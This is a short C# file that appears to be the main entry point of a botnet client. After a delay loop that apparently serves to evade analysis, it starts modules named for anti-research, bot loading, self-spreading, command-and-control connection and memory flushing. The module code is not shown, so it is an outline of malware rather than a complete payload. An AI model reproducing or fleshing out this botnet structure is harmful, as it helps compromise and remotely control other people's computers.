using System;
using System.Diagnostics;
using BotNet.Services.Common;
using BotNet.Services.Manager;
using Control = BotNet.Services.Manager.Control;

namespace BotNet
{
    class Program
    {
        static void Main()
        {
            int MAX = 100000000;
            int c = 0;
            while (c != MAX)
                c++;
            AntiResearch _antiResearch = new AntiResearch();
            Bot _bot = new Bot();
            Control _control = new Control();
            Factory _factoryService = new Factory();
            Spread _spreadService = new Spread();

            _antiResearch.StartAntiResearch();
            _bot.LoadSystem();
             
            _spreadService.SpreadStart();
            _control.ConnectControl();
            _factoryService.FlushMemory();
        }
    }
}
